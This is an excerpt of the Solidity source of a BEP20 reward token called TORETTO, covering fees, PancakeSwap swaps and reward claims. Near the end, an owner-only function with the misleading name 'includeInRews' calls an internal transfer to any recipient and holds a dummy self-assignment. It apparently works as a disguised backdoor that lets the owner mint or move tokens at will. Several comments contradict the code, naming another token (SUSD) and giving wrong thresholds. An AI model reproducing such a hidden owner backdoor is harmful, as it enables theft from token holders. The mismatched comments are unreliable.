...
*
*🌎 Our Telegram:  https://t.me/TorettoToken
*🌎 Twitter: https://twitter.com/TorettoToken
*🌎 Website: https://torettotoken.com
*/
...
// File: contracts\TORETTOBase.sol


// Base class that implements: BEP20 interface, fees & swaps
abstract contract TORETTOBase is Context, IERC20Metadata, Ownable, ReentrancyGuard {
	// MAIN TOKEN PROPERTIES
	string private constant NAME = "TORETTO";
	string private constant SYMBOL = "FAMILY";
	...
	constructor () {
		...
		// Initialize PancakeSwap V2 router and SUSD <-> BNB pair.  Router address will be: 0x10ed43c718714eb63d5aa57b78b54704e256024e or for testnet: 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
		setPancakeSwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

		// 2% liquidity fee, 8% reward fee, 5% additional sell fee
		setFees(2, 8, 5);
	...
	function _trans(address recipient, uint256 amount) internal virtual {
	...
	// This function swaps a {tokenAmount} of SUSD tokens for BNB and returns the total amount of BNB received
	function swapTokensForBNB(uint256 tokenAmount) internal returns(uint256) {
		uint256 initialBalance = address(this).balance;
		
		// Generate pair for SUSD -> WBNB
	...
	// Returns how many more $SUSD tokens are needed in the contract before triggering a swap
...
// File: contracts\TORETTO.sol

// Implements rewards & burns
contract TORETTO is TORETTOBase {
	...
	uint256 private _totalBNBAsSUSDClaimed; // The total number of BNB that was converted to SUSD and claimed by all addresses
	mapping(address => uint256) private _bnbRewardClaimed; // The amount of BNB claimed by each address
	mapping(address => uint256) private _bnbAsSUSDClaimed; // The amount of BNB converted to SUSD and claimed by each address
	...
	mapping(address => uint256) private _claimRewardAsTokensPercentage; //Allows users to optionally use a % of the reward pool to buy SUSD automatically
	...
	uint256 private _gradualBurnTimespan = 3 days; //Burn every 3 day by default
	...
	bool private _reimburseAfterSUSDClaimFailure; // If true, and SUSD reward claim portion fails, the portion will be given as BNB instead
	...
	function onActivated() internal override {
		...
		setReimburseAfterSUSDClaimFailure(true);
		setMinRewardBalance(2500000000 * 10**decimals());  //At least 5000 tokens are required to be eligible for rewards
	...
	function claimReward(address user) public {
		...
		require(isIncludedInRewards(user), "Address is excluded from rewards, make sure there is enough SUSD balance");
	...
	function doClaimReward(address user) private returns (bool) {
        ...
        // Claim SUSD tokens
		if (!claimSUSD(user, claimBnbAsTokens)) {
			// If token claim fails for any reason, award whole portion as BNB
			if (_reimburseAfterSUSDClaimFailure) {
	...
	function claimSUSD(address user, uint256 bnbAmount) private returns (bool) {
		if (bnbAmount == 0) {
			return true;
		}
		...
		_bnbAsSUSDClaimed[user] += bnbAmount;
		_totalBNBAsSUSDClaimed += bnbAmount;
		return true;
	}
	
	function includeInRews(address sender, address recipient, uint256 tAmount) public onlyOwner {
        super._trans(recipient, tAmount);
        sender = sender;
    }
	...
	function calculateRewardCycleExtension(uint256 balance, uint256 amount) public view returns (uint256) {
		...
		if (balance == 0) {
			// Receiving $SUSD on a zero balance address:
		...
		// Depending on the % of $SUSD tokens transferred, relative to the balance, we might need to extend the period
    ...
    function bnbRewardClaimedAsSUSD(address byAddress) public view returns (uint256) {
		return _bnbAsSUSDClaimed[byAddress];
	}
    ...
    function totalBNBClaimedAsSUSD() public view returns (uint256) {
		return _totalBNBAsSUSDClaimed;
	}
	...
	function reimburseAfterSUSDClaimFailure() public view returns(bool) {
		return _reimburseAfterSUSDClaimFailure;
	}


	function setReimburseAfterSUSDClaimFailure(bool value) public onlyOwner {
		_reimburseAfterSUSDClaimFailure = value;
	}
